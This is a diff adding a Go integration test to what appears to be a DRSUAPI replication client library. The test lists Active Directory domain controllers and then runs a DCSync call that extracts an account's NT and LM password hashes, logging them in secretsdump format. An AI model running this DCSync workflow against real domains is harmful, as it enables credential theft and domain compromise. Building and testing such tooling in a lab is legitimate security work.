@@ -136,3 +136,52 @@ func TestCrackAndReplicate(t *testing.T) {
 	// secretsdump-style line: sAMAccountName:RID:LMHash:NTHash:::
 	t.Logf("%s:%d:%x:%x:::", s.SAMAccountName, s.RID, s.LMHash, s.NTHash)
 }
+
+// TestDomainControllerInfoAndDCSync exercises the Phase 5 workflow: IDL_DRSDomainController
+// Info to enumerate DCs (and obtain the source DSA GUID), then the one-call DCSync helper.
+// Requires DRSUAPI_TEST_HOST, DRSUAPI_TEST_DNSDOMAIN (e.g. "lab.local"), and a target via
+// DRSUAPI_TEST_DN (recommended) or DRSUAPI_TEST_TARGET.
+func TestDomainControllerInfoAndDCSync(t *testing.T) {
+	host := os.Getenv("DRSUAPI_TEST_HOST")
+	dnsDomain := os.Getenv("DRSUAPI_TEST_DNSDOMAIN")
+	dn := os.Getenv("DRSUAPI_TEST_DN")
+	if host == "" || dnsDomain == "" || dn == "" {
+		t.Skip("set DRSUAPI_TEST_HOST, DRSUAPI_TEST_DNSDOMAIN and DRSUAPI_TEST_DN to run")
+	}
+	creds, err := credentials.NewCredentials(
+		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
+		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"))
+	if err != nil {
+		t.Fatalf("build credentials: %v", err)
+	}
+
+	c := msdrsr.New(host, creds)
+	c.SetTimeout(15 * time.Second)
+	if err := c.Connect(); err != nil {
+		t.Fatalf("Connect: %v", err)
+	}
+	defer c.Close()
+
+	dcs, err := c.DomainControllerInfo(dnsDomain)
+	if err != nil {
+		t.Fatalf("DomainControllerInfo: %v", err)
+	}
+	if len(dcs) == 0 {
+		t.Fatal("no DCs returned")
+	}
+	for _, dc := range dcs {
+		t.Logf("DC %s (%s) site=%s ntdsDsaGuid=%s pdc=%v gc=%v",
+			dc.NetbiosName, dc.DNSHostName, dc.SiteName, dc.NtdsDsaObjectGuid.ToFormatD(), dc.IsPDC, dc.IsGC)
+	}
+	// Use the first DC's DSA GUID as the replication source (robustness path).
+	c.SetSourceDSA(dcs[0].NtdsDsaObjectGuid)
+
+	sec, err := c.DCSyncByDN(dn)
+	if err != nil {
+		t.Fatalf("DCSyncByDN: %v", err)
+	}
+	if !sec.HasNT {
+		t.Error("DCSync returned no NT hash")
+	}
+	t.Logf("%s:%d:%x:%x:::", sec.SAMAccountName, sec.RID, sec.LMHash, sec.NTHash)
+}
